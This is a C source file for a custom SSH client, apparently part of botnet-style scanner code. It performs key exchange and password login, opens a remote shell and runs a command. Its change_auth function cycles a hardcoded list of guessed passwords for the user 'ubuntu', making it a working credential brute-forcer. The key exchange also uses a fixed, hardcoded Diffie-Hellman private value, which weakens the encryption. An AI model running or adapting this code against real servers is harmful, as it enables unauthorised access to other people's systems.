#include "ssh.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <unistd.h>

/**
 *  
 * sshd 
 * 
 */

#ifdef DEBUG
void main(void){
    ipv4_t addr = INET_ADDR(192,168,56,103);
    char username[7] = "test\0";
    char password[9] = "test\0";

   printf("start\n");
    init(addr, 22, username, password);
}
#endif

#ifdef DEBUG
char* PacketToString(ssh_packet* packet){
    return MessageCodeToString(ssh_packet_msg_code(packet));
}

char* MessageCodeToString(uint8_t message_code){
    switch(message_code){
        case SSH_SERVICE_REQUEST: return"SERVICE REQUEST";
        case SSH_SERVICE_REQUEST_ACCEPT: return "SERVICE ACCEPT";
        case SSH_KEXINIT: return "KEX INIT";
        case SSH_NEWKEYS: return "NEW KEYS";
        case SSH_KEX_ECDH_INIT: return "DH INIT";
        case SSH_KEX_ECDH_REPLY: return "DH REPLY";
        case SSH_USERAUTH_REQUEST: return "USERAUTH REQUEST";
        case SSH_USERAUTH_FAILURE: return "USERAUTH FAILURE";
        case SSH_USERAUTH_SUCCESS: return "USERAUTH SUCCESS";
        case SSH_CHANNEL_OPEN: return "CHANNEL OPEN";
        case SSH_CHANNEL_OPEN_CONFIRMATION: return "CHANNEL CONFIRMATION";
        case SSH_CHANNEL_OPEN_FAILURE: return "CHANNEL FAILURE";
        case SSH_CHANNEL_REQUEST: return "CHANNEL REQUEST";
        case SSH_CHANNEL_SUCCESS: return "CHANNEL SUCCESS";
        case SSH_CHANNEL_FAILURE: return "CHANNEL FAILURE";
        case SSH_GLOBAL_REQUEST: return "GLOBAL REQUEST";
        case SSH_DISCONNECT: return "DISCONNECT";
        case SSH_CHANNEL_EXTENDED_DATA: return "CHANNEL EXTENDED DATA";
        case SSH_CHANNEL_DATA: return "CHANNEL DATA";
        case SSH_CHANNEL_WINDOW_ADJUST: return "CHANNEL WINDOWS ADJUST";
        default:
            return NULL;
    }
}
#endif

int con_tcp(ipv4_t ipv4, port_t port){
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        #ifdef DEBUG
           printf("socket creation failed...\n");
		#endif
        return sockfd;
    }
    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = ipv4;
    servaddr.sin_port = htons(port);

    if(connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) != 0){
        #ifdef DEBUG
           printf("connection with the server failed...\n");
		#endif
        return -1;
    }

    return sockfd;
}

void lprintf(const char* file_name, const char* buff, ...){
    FILE* log_file;
    va_list args;

    log_file = fopen(file_name, "ab+"); // a+ (create + append) option will allow appending which is useful in a log file
    va_start(args, buff);
    vfprintf(log_file, buff, args);
    va_end(args);
    fclose(log_file);
}

int str_search(char *buf, int buf_len, char *mem, int mem_len){
    int i, matched = 0;
    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++){
        if (buf[i] == mem[matched]){
            if (++matched == mem_len)
                return i + 1;
        }else
            matched = 0;
    }
    return -1;
}

void read_ssh_packet_DH_reply(ssh_connection* ssh, ssh_packet* packet){
    int i, server_host_key_length, k_length, f_length, f_trim_length;
    u_char* server_host_key_blob, *hash, *f_blob, *k_blob;
    bn_t *F, *K;

    ssh_packet_reset_ptr(packet);

    //Read Host Key
    server_host_key_blob = ssh_packet_read_str(packet, &server_host_key_length);

    //Read DH F
    f_blob = ssh_packet_read_str(packet, &f_length);
    packet->ptr -= f_length;
    f_trim_length = f_length;

    //Trim F
    for(i=0; i<f_length; i++)
        if(*(f_blob+i) != 0x00)
            break;
        else f_trim_length--;
    
    packet->ptr += f_length - f_trim_length;
    F = bn_from_bin(bn_alloc(f_trim_length),packet->ptr,f_trim_length);
    packet->ptr += f_trim_length;

    //Calc DH shared secret
    K = bn_positiv(dh_calc(ssh->dh,F));
    bn_free(F);

    k_length = K->n;
    k_blob = calloc(sizeof(u_char), k_length);
    bn_to_bin(k_blob,K);
    bn_free(K);

    //Create hash
    hash = create_ssh_hash(ssh, f_blob, f_length, k_blob, k_length, server_host_key_blob, server_host_key_length);

    #ifdef DEBUG
   printf("\nhash:");
    for(int i = 0; i < SHA256_HASH_SIZE;i++)
       printf("%02X",*(hash+i));
   printf("\n");
    #endif

    //create aes keys
    create_ssh_keys(ssh, k_blob, k_length, hash);

    free(server_host_key_blob);
    free(k_blob);
    free(f_blob);
    free(hash);
}

int consume_ssh_protocol(ssh_connection* ssh){
    int count;
    unsigned char* ptr;
    int ending = str_search(ssh->connection.buff,ssh->connection.buffpos,"SSH",3);
    if(ending > 0){
        ending -= 3;
        count = 0;
        ptr = &ssh->connection.buff[ending];

        while(ending < ssh->connection.buffpos){
            if(ssh->connection.buff[ending-1] == 0x0d && ssh->connection.buff[ending] == 0x0a){
                count--;
                ending++;
                break;
            }
            count++;
            ending++;
        }
        ssh->V_S = calloc(sizeof(unsigned char), count+1);
        memcpy(ssh->V_S, ptr,count);
        return ending;
    }
    return 0;
}

void read_ssh_packet_disconnect(ssh_packet* packet){
    #ifdef DEBUG
    int i;
    u_char* str;
    ssh_packet_reset_ptr(packet);

   printf("DISCONNECT\n");
    i = ssh_packet_read_u32(packet);
   printf("reason code: %i\n",i);
    str = ssh_packet_read_str(packet, &i);
   printf("description: %s\n",str);
    free(str);
    str = ssh_packet_read_str(packet, &i);
   printf("language tag: %s\n",str);
    free(str);
    #endif
    exit(0);
}

#ifdef DEBUG
void read_ssh_packet_channel_open_failure(ssh_packet* packet){
    int i;
    u_char* str;
    ssh_packet_reset_ptr(packet);

   printf("CHANNEL OPEN FAILURE\n");
    i = ssh_packet_read_u32(packet);
   printf("recipient-channel: %i\n",i);
    i = ssh_packet_read_u32(packet);
   printf("reason-code: %i\n",i);
    str = ssh_packet_read_str(packet, &i);
   printf("description: %s\n",str);
    free(str);
    str = ssh_packet_read_str(packet, &i);
   printf("language tag: %s\n",str);
    free(str);
}
#endif

#ifdef DEBUG
void read_ssh_packet_channel_window_adjust(ssh_packet* packet){
    int i;
    ssh_packet_reset_ptr(packet);

   printf("CHANNEL WINDOW ADJUST\n");
    i = ssh_packet_read_u32(packet);
   printf("recipient-channel: %i\n",i);
    i = ssh_packet_read_u32(packet);
   printf("bytes to add: %i\n",i);
}
#endif

void read_ssh_packet_channel_confirm(ssh_connection* ssh,ssh_packet* packet){
    ssh_packet_reset_ptr(packet);

    #ifdef DEBUG
    int i;
   printf("CHANNEL CONFIRM\n");
    i = ssh_packet_read_u32(packet);
   printf("recipient-channel: %i\n",i);
    #else
    packet->ptr+=4;
    #endif
    ssh->recipient_channel = ssh_packet_read_u32(packet);
    #ifdef DEBUG
   printf("sender channel: %i\n",ssh->recipient_channel);
    i = ssh_packet_read_u32(packet);
   printf("initial window size: %i\n",i);
    i = ssh_packet_read_u32(packet);
   printf("maximum packet size: %i\n",i);
    #endif
}

#ifdef DEBUG
void read_ssh_packet_global_request(ssh_packet* packet){
    int request_name_length;
    u_char* request_name;
    ssh_packet_reset_ptr(packet);

   printf("GLOBAL REQUEST\n");
    request_name = ssh_packet_read_str(packet, &request_name_length);
   printf("request-Name: %s\n", request_name);
   printf("want-reply: %s\n", (*(packet->ptr++) == FALSE ? "FALSE" : "TRUE"));
}
#endif

u_char* read_ssh_packet_channel_data(ssh_packet* packet,int* strlen){
    int recipient_channel, data_type_code;
    uint8_t message_code;
    u_char* str;
    ssh_packet_reset_ptr(packet);
    message_code = ssh_packet_msg_code(packet);

    recipient_channel = ssh_packet_read_u32(packet);
    if(message_code == SSH_CHANNEL_EXTENDED_DATA)
        data_type_code = ssh_packet_read_u32(packet);
    str = ssh_packet_read_str(packet, strlen);

    return str;
}

int handle_recv(ssh_connection* ssh,ssh_packet** out_packet){
    ssh_packet* packet;
    char* str;
    int consumed = 0, new_line = 0, str_length = 0;

    //Wait for protocol message
    if(ssh->V_S == NULL){
        if( (consumed = consume_ssh_protocol(ssh)) > 0 ){
            #ifdef DEBUG
           printf("SSH Protocol: %s\n", ssh->V_S);
            #endif

            ssh->I_C = create_ssh_packet_kexinit(ssh);
            send_ssh_packet(ssh,ssh->I_C);
        }
    }else{
        packet = read_ssh_packet(ssh);
        if(packet != NULL){

            consumed = packet->payload_size + (ssh->encrypt && ssh_packet_msg_code(packet) != SSH_NEWKEYS ? SHA256_HASH_SIZE : 0);

            //Get Message Code
            switch(ssh_packet_msg_code(packet)){
                case SSH_KEXINIT:
                    //Store Packet for creating HASH
                    ssh->I_S = packet;
                    send_ssh_packet(ssh,create_ssh_packet_DHE(ssh));
                break;
                case SSH_KEX_ECDH_REPLY:
                    read_ssh_packet_DH_reply(ssh,packet);         
                    send_ssh_packet(ssh,create_ssh_packet(ssh, SSH_NEWKEYS, 0));   
                break;
                case SSH_NEWKEYS:
                    ssh->encrypt = TRUE; //Activate encryption and HMAC
                    send_ssh_packet(ssh,create_ssh_packet_service_request(ssh));
                break;
                case SSH_SERVICE_REQUEST_ACCEPT:
                    send_ssh_packet(ssh,create_ssh_userauth_request(ssh));
                break;
                case SSH_USERAUTH_SUCCESS:
                    send_ssh_packet(ssh, create_ssh_channel_open(ssh));
                break;
                case SSH_USERAUTH_FAILURE:
                    #ifdef DEBUG
                   printf("user authentication request FAILED!\n");
                    #endif
                    change_auth(ssh);
                    sleep(1); //maybe sleep for a second
                    send_ssh_packet(ssh,create_ssh_userauth_request(ssh));
                break;
                #ifdef DEBUG
                case SSH_GLOBAL_REQUEST:
                    read_ssh_packet_global_request(packet);
                break;
                case SSH_CHANNEL_OPEN_FAILURE:
                   printf("channel open FAILED!\n");
                    read_ssh_packet_channel_open_failure(packet);
                    ssh_cleanup_and_close(ssh,TRUE);
                break;
                case SSH_CHANNEL_WINDOW_ADJUST:
                    read_ssh_packet_channel_window_adjust(packet);
                break;
                #endif
                case SSH_CHANNEL_OPEN_CONFIRMATION:
                    read_ssh_packet_channel_confirm(ssh,packet);
                    send_ssh_packet(ssh, create_ssh_channel_request(ssh));
                break;
                case SSH_CHANNEL_SUCCESS:
                    send_ssh_packet(ssh,create_ssh_channel_data(ssh, "date"));
                break;
                case SSH_CHANNEL_FAILURE:
                    #ifdef DEBUG
                   printf("channel reuqest FAILED!\n");
                    #endif
                    ssh_cleanup_and_close(ssh,TRUE);
                break;
                case SSH_DISCONNECT:
                    read_ssh_packet_disconnect(packet);
                    ssh_cleanup_and_close(ssh,FALSE);
                break;
                case SSH_CHANNEL_DATA:
                case SSH_CHANNEL_EXTENDED_DATA:
                    str = read_ssh_packet_channel_data(packet, &str_length);

                    if( (str_length + ssh->linepos) < SSH_LINE_SIZE ){
                        memcpy(ssh->line+ssh->linepos, str, str_length+1);
                        ssh->linepos+=str_length;
                        printf(">ssh add to line: %s(%i)\n",str,str_length);
                    }else{
                        printf(">ssh line buffer full\n");
                    }

                    ssh_next_line(ssh,out_packet);
                    free(str);
                    //sleep(1);
                    //send_ssh_packet(ssh,create_ssh_channel_data(ssh, "date"));
                break;
            }

            if(ssh_packet_msg_code(packet) != SSH_KEXINIT)
                packet_free(packet);
        }
    }
    return consumed;
}

BOOL ssh_next_line(ssh_connection* ssh,ssh_packet** out_packet){
    int new_line;

    if((new_line  = has_new_line(ssh)) != 0){
        (*out_packet)->payload = calloc(sizeof(char),new_line+1);
        (*out_packet)->payload_size = new_line;
        (*out_packet)->ptr = (*out_packet)->payload;
        memcpy((*out_packet)->payload,ssh->line,new_line);
        //         to         from               size
        memmove(ssh->line, ssh->line+new_line, SSH_LINE_SIZE - new_line);
        ssh->linepos -= new_line;

    

        return TRUE;
    }else{
        (*out_packet)->payload = NULL;
    }
    return FALSE;
}

int has_new_line(ssh_connection* ssh){
    int i;
    for(i=0;i<ssh->linepos;i++){
        if(ssh->line[i] == '\n')
            return i;
    }
    return 0;
}

void ssh_cleanup_and_close(ssh_connection* ssh, BOOL send_disconnect_packet){
    if(send_disconnect_packet){
        send_ssh_packet(ssh, create_ssh_disconnect(ssh));
    }

    close(ssh->connection.sockfd);

    if(ssh->V_S != NULL)
        free(ssh->V_S);
    if(ssh->I_C != NULL)
        packet_free(ssh->I_C);
    if(ssh->I_S != NULL)
        packet_free(ssh->I_S);

    free(ssh->out_aes);
    free(ssh->in_aes);
    free(ssh->in_mac_aes);
    free(ssh->out_mac_aes);
    free(ssh->dh);
    free(ssh->connection.buff);
    free(ssh);
    //kill(pid,SIGKILL); //Terminate Child Process
}

void init(ipv4_t addr, port_t port,char* username, char* password){
    int read, consumed;
    ssh_connection* ssh;
    ssh_packet* packet;

    srand(time(NULL));
    ssh = calloc(sizeof(ssh_connection),1);
    packet = calloc(sizeof(ssh_packet), 1);

    strcpy(ssh->info.username,username);
    strcpy(ssh->info.password,password);
    ssh->info.has_arch = FALSE;
    ssh->send_packet_counter = 0;
    ssh->rec_packet_counter = -1;
    ssh->encrypt = FALSE;
    ssh->info.addr = addr;
    ssh->info.port = port;
    ssh->connection.buffsize = 8192;
    ssh->connection.buffpos = 0;
    ssh->V_S = NULL;
    ssh->linepos = 0;
    ssh->line = calloc(sizeof(char), SSH_LINE_SIZE);
    
    if( (ssh->connection.buff = calloc(sizeof(char), ssh->connection.buffsize)) == NULL ){
        #ifdef DEBUG
       printf("> could not reserve memory\n");
        #endif
        exit(0);
    }

    ssh->connection.sockfd = con_tcp(addr,port);
    send(ssh->connection.sockfd, "SSH-2.0\r\n", 15, MSG_NOSIGNAL);

    int cmd = 0;

    while(TRUE){
        //printf(">ssh read from socket buffpos:%i\n",ssh->connection.buffpos);
        read = recv(ssh->connection.sockfd, ssh->connection.buff + ssh->connection.buffpos, ssh->connection.buffsize - ssh->connection.buffpos, MSG_NOSIGNAL);
        //printf(">ssh read %i\n",read);
        ssh->connection.buffpos += read;

        if(read < 0){
            if (errno != EAGAIN && errno != EWOULDBLOCK){
                #ifdef DEBUG
               printf("> Encountered error %d. Closing\n", errno);
                #endif
            }
            break;
        }else if(ssh->connection.buffpos > 0 && ssh->connection.buffpos <= ssh->connection.buffsize){
            handle:
            //Handle packets...
            consumed = handle_recv(ssh,&packet);

            line:
            if(packet->payload!=NULL){
                lprintf("ssh.log", packet->payload);
                free(packet->payload);
            }

            if(ssh_next_line(ssh, &packet)){
                printf(">ssh goto read line:%.*s",packet->payload_size, packet->payload);
                goto line;
            }

            if(consumed > 0){
                //Move the pointer
                ssh->connection.buffpos-=consumed;
                //Move RAM
                memmove(ssh->connection.buff, ssh->connection.buff + consumed, ssh->connection.buffpos);
                ssh->connection.buff[ssh->connection.buffpos] = 0;
                //printf(">ssh consumed:%i new buffpos:%i\n",consumed, ssh->connection.buffpos);
                
                if(ssh->connection.buffpos >= 8 && ssh->connection.buffpos < ssh->connection.buffsize){
                    goto handle;
                }
            }

            if (ssh->connection.buffpos > 8196){
                #ifdef DEBUG
               printf("> oversized buffer! %i 2\n",ssh->connection.buffpos);
                #endif
                break;
            }
        }
    }
}

int tries = 0;
void change_auth(ssh_connection* ssh){
    tries++;

    switch(tries){
        case 1:
        strcpy(ssh->info.username, "ubuntu\0");
        strcpy(ssh->info.password, "root\0");
        break;
        case 2:
        strcpy(ssh->info.username, "ubuntu\0");
        strcpy(ssh->info.password, "test\0");
        break;
        case 3:
        strcpy(ssh->info.username, "ubuntu\0");
        strcpy(ssh->info.password, "lol\0");
        break;
        case 4:
        strcpy(ssh->info.username, "ubuntu\0");
        strcpy(ssh->info.password, "test1\0");
        break;
        default:
        strcpy(ssh->info.username, "ubuntu\0");
        strcpy(ssh->info.password, "daropass\0");
        break;
    }
}

ssh_packet* create_ssh_channel_data(ssh_connection* ssh,char* data){
    ssh_packet* packet;
    int length = strlen(data) + 1;
    packet = create_ssh_packet(ssh, SSH_CHANNEL_DATA, 8 + length);
    ssh_packet_put_u32(packet,ssh->recipient_channel); //sender channel
    _ssh_packet_put_str(packet, data, length);
    *--packet->ptr = 0x0a; // \n
    return packet;
}

ssh_packet* create_ssh_channel_request(ssh_connection* ssh){
    ssh_packet* packet;
    char request_type[6] = "shell\0";

    packet = create_ssh_packet(ssh, SSH_CHANNEL_REQUEST, 9 + strlen(request_type));
    ssh_packet_put_u32(packet,ssh->recipient_channel); //sender channel
    ssh_packet_put_str(packet,request_type); //request type
    *packet->ptr = TRUE; //want-reply 
    return packet;
}

ssh_packet* create_ssh_channel_open(ssh_connection* ssh){
    ssh_packet* packet;
    char channel_type[8] = "session\0";

    packet = create_ssh_packet(ssh, SSH_CHANNEL_OPEN, 4*4+strlen(channel_type));
    ssh_packet_put_str(packet,channel_type);
    ssh_packet_put_u32(packet, 42);//sender channel             channel number can be choosen
    ssh_packet_put_u32(packet, 16384);//initial window size     16KB
    ssh_packet_put_u32(packet, 32768);//maximum packet size     32KB from openssh

    return packet;
}

ssh_packet* create_ssh_disconnect(ssh_connection* ssh){
    ssh_packet* packet;

    /*
    Reason-Codes:
    SSH_DISCONNECT_HOST_NOT_ALLOWED_TO_CONNECT             1
    SSH_DISCONNECT_PROTOCOL_ERROR                          2
    SSH_DISCONNECT_KEY_EXCHANGE_FAILED                     3
    SSH_DISCONNECT_RESERVED                                4
    SSH_DISCONNECT_MAC_ERROR                               5
    SSH_DISCONNECT_COMPRESSION_ERROR                       6
    SSH_DISCONNECT_SERVICE_NOT_AVAILABLE                   7
    SSH_DISCONNECT_PROTOCOL_VERSION_NOT_SUPPORTED          8
    SSH_DISCONNECT_HOST_KEY_NOT_VERIFIABLE                 9
    SSH_DISCONNECT_CONNECTION_LOST                        10
    SSH_DISCONNECT_BY_APPLICATION                         11
    SSH_DISCONNECT_TOO_MANY_CONNECTIONS                   12
    SSH_DISCONNECT_AUTH_CANCELLED_BY_USER                 13
    SSH_DISCONNECT_NO_MORE_AUTH_METHODS_AVAILABLE         14
    SSH_DISCONNECT_ILLEGAL_USER_NAME                      15

    */

    packet = create_ssh_packet(ssh, SSH_DISCONNECT, 12);
    ssh_packet_put_u32(packet, 11); // SSH_DISCONNECT_BY_APPLICATION        
    ssh_packet_put_u32(packet, 0); //String description length
    ssh_packet_put_u32(packet, 0); //String lang
    return packet;
}

ssh_packet* create_ssh_userauth_request(ssh_connection* ssh){
    int allocate;
    ssh_packet* packet;
    char service_name[15] = "ssh-connection\0";
    char method_name[9] = "password\0";

    allocate = 4 + strlen(ssh->info.username)
    + 4 + strlen(service_name)
    + 4 + strlen(method_name)
    + 4 + strlen(ssh->info.password)
    + 1;

    packet = create_ssh_packet(ssh, SSH_USERAUTH_REQUEST, allocate);

    ssh_packet_put_str(packet, ssh->info.username);
    ssh_packet_put_str(packet, service_name);
    ssh_packet_put_str(packet, method_name);
    *(packet->ptr++) = 0x00;
    ssh_packet_put_str(packet, ssh->info.password);
    
    #ifdef DEBUG
   printf("    Username: %s\n", ssh->info.username);
   printf("    Password: %s\n", ssh->info.password);
    #endif
    
    return packet;
}

ssh_packet* create_ssh_packet_DHE(ssh_connection* ssh){
    int allocate;
    ssh_packet* packet;

    allocate = 4 // e length
    + 256; // e 

    packet = create_ssh_packet(ssh, SSH_KEX_ECDH_INIT,allocate);

    ssh->dh = (dh_ctx*) calloc(sizeof(dh_ctx),1);
    ssh->dh->prime = bn_from_bin(bn_alloc(256),GROUP_14,256);
    ssh->dh->generator = bn_from_bin(bn_alloc(256),"\x02",1);
    ssh->dh->x = bn_from_bin(bn_alloc(256),"\xaf\x54\x79\x0a\x60\x2b\xdc\xbe\x33\x8c\xa5\x2b\x9f\x19\x76\xe9\x95\xa9\x10\xec\x82\xd2\x1f\x6d\x77\x71\x5c\xf9\x79\xd1\x56\xf3\x08\xed\x0e\xb5\x6b\xb0\x17\x9f\xf1\x53\xcd\xb3\xff\xd5\xf3\x7f\x62\x0d\xef\x10\x44\x73\x9d\x2a\x72\x30\x04\x8f\x1d\xc7\x22\xb1\x6f\x2a\x65\xfe\x57\x5e\x57\xf1\x31\xec\x8f\x07\xed\xae\x90\x8a\x73\x5e\xa3\xe9\xb5\xe2\xa7\xde\x14\x70\x2e\x62\x88\x1b\xd0\x3c\x4f\x22\x0b\xfc\xb1\xde\xcf\xb7\x9e\xda\x45\x50\xf5\x87\x6a\xee\x6d\x00\x14\xa4\x26\x27\x65\x62\x64\x92\x4e\x69\xbf\x06\x09\xc3\xa2\x5e\x98\x08\xf2\x5b\xff\x75\xc8\xcf\x46\x93\xa2\xa6\x9f\x5e\x75\x24\xd6\x7f\xf5\xd2\xf2\x1f\xb2\x46\xd3\xd0\xd9\x56\xee\x93\xb9\x42\x04\x65\x1b\x43\x60\xc0\x7c\xe5\xdd\xbc\x17\x2e\x9a\xa6\x6e\x91\x3c\x86\x32\x5a\x75\x56\x2a\x48\x3e\x08\x18\xef\x35\x47\x0d\x0c\xd1\x06\x5d\xec\x95\x71\xd8\xf0\xd6\x8d\x4d\xc4\xbf\x47\xbf\x74\xec\xa6\x48\x76\x80\xbb\xf3\xe3\x6a\x94\x2e\xae\x4d\xb5\x61\x0e\xb1\x94\xc0\x1c\x19\xa0\x01\xbb\x4a\x44\x05\x9b\xb8\xb1\x16\x8d\xb5\x79\x6d\xf8\x44\xd8\xee\x4d\xda\xe2\xc1\xc5\x3b\x8e",256);
    ssh->dh->X = bn_alloc(ssh->dh->prime->n);
    bn_pow_mod(ssh->dh->X,ssh->dh->generator,ssh->dh->x,ssh->dh->prime);
    ssh_packet_put_bn(packet, ssh->dh->X);
    return packet;
}

ssh_packet* create_ssh_packet_service_request(ssh_connection* ssh){
    ssh_packet* packet;
    char service_name[13] = "ssh-userauth\0";
    packet = create_ssh_packet(ssh, SSH_SERVICE_REQUEST, 4 + strlen(service_name));
    ssh_packet_put_str(packet, service_name);
    return packet;
}

ssh_packet* create_ssh_packet_kexinit(ssh_connection* ssh){
    int allocate;
    ssh_packet* packet;
    u_char kex_alg[68] = "diffie-hellman-group14-sha256,diffie-hellman-group-exchange-sha256\0";
    u_char host_key_alg[22] = "ssh-rsa,rsa-sha2-256\0";
    u_char encr_alg[11] = "aes256-ctr\0";
    u_char mac_alg[14] = "hmac-sha2-256\0";
    u_char com_alg[5] = "none\0";

    allocate = 16 //Cookie
    + strlen(kex_alg) + 4
    + strlen(host_key_alg) + 4
    + (strlen(encr_alg) + 4) * 2
    + (strlen(mac_alg) + 4) * 2
    + (strlen(com_alg) + 4) * 2
    + 2 * 4 //lang_alg
    + 1 //first kex packet follows
    + 4; //Reserved

    packet = create_ssh_packet(ssh, SSH_KEXINIT, allocate);
    packet->ptr += add_random_hex(packet->ptr, 16); //Add Cookie

    ssh_packet_put_str(packet, kex_alg);
    ssh_packet_put_str(packet, host_key_alg);
    ssh_packet_put_str(packet, encr_alg);
    ssh_packet_put_str(packet, encr_alg);
    ssh_packet_put_str(packet, mac_alg);
    ssh_packet_put_str(packet, mac_alg);
    ssh_packet_put_str(packet, com_alg);
    ssh_packet_put_str(packet, com_alg);
    ssh_packet_put_str(packet, "");
    ssh_packet_put_str(packet, "");

    //First Kex Packet Follows should be 0x00
    //Reserved 0x00
    return packet;
}

#ifdef DEBUG
void ssh_print_packet(ssh_packet* packet){
   printf("Packet %s(%i size:%i):\n",MessageCodeToString(ssh_packet_msg_code(packet)),ssh_packet_msg_code(packet),packet->payload_size);
    
    for(int i = 0; i < packet->payload_size; i++){
       printf("%02X ", *(packet->payload+i));
        if( ((i+1) % 16) == 0 )
           printf(" ");
        if( ((i+1) % 32) == 0 )
           printf("\n");
    }
   printf("\n");
}
#endif

u_char* create_ssh_hash(ssh_connection* ssh, u_char* F, int flen, u_char* K, int klen, u_char* server_host_key_blob, int server_host_key_len){
    int total_length;
    BYTE* hash;
    SHA256_CTX* sha;
    u_char* data, *ptr;
    u_char V_C[14] = "SSH-2.0\0";
    sha = calloc(sizeof(SHA256_CTX), 1);
    hash = calloc(sizeof(u_char), SHA256_HASH_SIZE);

    total_length = strlen(V_C)
    + strlen(ssh->V_S)
    + klen + flen
    + ssh->dh->X->n
    + (ssh->I_C->payload_size-ssh_packet_padding_length(ssh->I_C)-5) // - PADDING - PACKET_LENGTH - PADDING_LENGTH
    + (ssh->I_S->payload_size-ssh_packet_padding_length(ssh->I_S)-5) // - PADDING - PACKET_LENGTH - PADDING_LENGTH
    + server_host_key_len
    + 8 * 4;

    data = calloc(sizeof(u_char), total_length);
    ptr = data;
    ptr += ptr_put_str(ptr, V_C, strlen(V_C));
    ptr += ptr_put_str(ptr, ssh->V_S, strlen(ssh->V_S));
    ptr += ptr_put_str(ptr, ssh->I_C->payload + 5, ssh->I_C->payload_size-ssh_packet_padding_length(ssh->I_C)-5);
    ptr += ptr_put_str(ptr, ssh->I_S->payload + 5, ssh->I_S->payload_size-ssh_packet_padding_length(ssh->I_S)-5);
    ptr += ptr_put_str(ptr, server_host_key_blob, server_host_key_len);
    ptr += ptr_put_bn(ptr, ssh->dh->X);
    ptr += ptr_put_str(ptr, F, flen);
    ptr += ptr_put_str(ptr, K, klen);

    sha256_init(sha);
    sha256_update(sha, data, total_length);
    sha256_final(sha, hash);

    packet_free(ssh->I_C);
    packet_free(ssh->I_S);
    free(sha);
    free(data);
    ssh->I_C = NULL;
    ssh->I_S = NULL;
    return hash;
}

void ssh_hash(u_char* K, int klen,u_char *hash, char a, BYTE buf[]) {
    SHA256_CTX sha;
    memset(buf, 0x00, SHA256_HASH_SIZE);

    sha256_init(&sha);
    sha256_update_str(&sha, K, klen);
    sha256_update(&sha, hash, 32);
    sha256_update(&sha, &a, 1);
    sha256_update(&sha, hash, 32);
    sha256_final(&sha, buf);
}

void create_ssh_keys(ssh_connection* ssh,u_char* K, int klen, u_char *hash){
    BYTE buf[SHA256_HASH_SIZE];
    uint8_t out_iv[16];
    uint8_t in_iv[16];
    uint8_t out_key[32];
    uint8_t in_key[32];

    ssh->out_aes = (struct AES_ctx*) calloc(sizeof(AES_ctx_t),1);
    ssh->in_aes = (struct AES_ctx*) calloc(sizeof(AES_ctx_t),1);
    ssh->out_mac_aes = calloc(sizeof(unsigned char),32);
    ssh->in_mac_aes = calloc(sizeof(unsigned char),32);

    //Initial IV CLIENT TO SERVER
    ssh_hash(K, klen,hash,'A',buf);
    memcpy(out_iv, buf, 16);

    //Initial IV SERVER TO CLIENT
    ssh_hash(K, klen,hash,'B',buf);
    memcpy(in_iv, buf, 16);

    //Encryption Key CLIENT TO SERVER
    ssh_hash(K, klen,hash,'C',buf);
    memcpy(out_key, buf, 32);

    //Encryption Key SERVER TO CLIENT
    ssh_hash(K, klen,hash,'D',buf);
    memcpy(in_key, buf, 32);

    //Encryption Key CLIENT TO SERVER
    ssh_hash(K, klen,hash,'E',buf);
    memcpy(ssh->out_mac_aes, buf, 32);

    //Encryption Key SERVER TO CLIENT
    ssh_hash(K, klen,hash,'F',buf);
    memcpy(ssh->in_mac_aes, buf, 32);

    #ifdef DEBUG
   printf("MODE IN:\n");
    int i;
   printf("        iv:");
    for(i = 0; i < 16;i++)
       printf("%02X",in_iv[i]);
   printf("\n");
   printf("        key:");
    for(i = 0; i < 32;i++)
       printf("%02X",in_key[i]);
   printf("\n");
   printf("        mac key:");
    for(i = 0; i < 32;i++)
       printf("%02X", *(ssh->in_mac_aes+i));
   printf("\n");
    
   printf("MODE OUT:\n");
   printf("        iv:");
    for(i = 0; i < 16;i++)
       printf("%02X",out_iv[i]);
   printf("\n");
   printf("        key:");
    for(i = 0; i < 32;i++)
       printf("%02X",out_key[i]);
   printf("\n");

   printf("        mac key:");
    for(i = 0; i < 32;i++)
       printf("%02X", *(ssh->out_mac_aes+i));
   printf("\n");
    #endif

    AES_init_ctx_iv(ssh->out_aes, &out_key[0], &out_iv[0]);
    AES_init_ctx_iv(ssh->in_aes, &in_key[0], &in_iv[0]);
}

uint8_t get_padding_length(int payload_size, int block_size){
    int padding_len;
    padding_len = block_size - (payload_size % block_size);
    if(padding_len < 4) return padding_len + block_size;
    if(padding_len > 255) return 255;
    return padding_len;
}

uint8_t add_random_hex(u_char* ptr, int len){
    int i;
    for(i = 0; i < len; i++)
        *(ptr+i) = rand()%256;
    return len;
}

uint8_t add_padding(ssh_packet* packet){
    uint8_t *ptr, padding_length;
    padding_length = ssh_packet_padding_length(packet); 
    ptr = packet->payload + (packet->payload_size - padding_length);
    return add_random_hex(ptr, padding_length);
}

ssh_packet* create_ssh_packet(ssh_connection* ssh, int message_code, int allocate){
    int block_size;
    ssh_packet* packet;
    uint8_t padding_length;

    block_size = ssh->encrypt ? AES_BLOCKLEN : 8;
    packet = calloc(sizeof(ssh_packet),1);
    packet->payload_size = 6 + allocate; // 4 packet_length, 1 padding_length, 1 Message code
    padding_length = get_padding_length(packet->payload_size, block_size);
    packet->payload_size += padding_length;
    packet->payload = calloc(sizeof(uint8_t), packet->payload_size + (ssh->encrypt ? SHA256_HASH_SIZE : 0)); //add hmac to payload if encrpyt=TRUE
    packet->ptr = packet->payload;
    ssh_packet_put_u32(packet, packet->payload_size-4);
    *(packet->ptr++) = padding_length;
    *(packet->ptr++) = message_code;
    add_padding(packet);
    return packet;
}

void ssh_packet_create_hmac(ssh_connection* ssh,ssh_packet* packet){
    u_char* ptr;
    u_char* data;
    int datalen;

    ptr = packet->payload+packet->payload_size;
    datalen = packet->payload_size + 4; //payload_size+seq_num
    data = calloc(sizeof(u_char), datalen);

    *data = (ssh->send_packet_counter >> 24) & 0xFF;
    *(data+1) = (ssh->send_packet_counter >> 16) & 0xFF;
    *(data+2) = (ssh->send_packet_counter >> 8) & 0xFF;
    *(data+3) = ssh->send_packet_counter & 0xFF;
    memcpy(data+4, packet->payload, packet->payload_size);

    hmac_sha256(ssh->out_mac_aes, SHA256_HASH_SIZE, data, datalen, ptr, SHA256_HASH_SIZE);
    free(data);
}

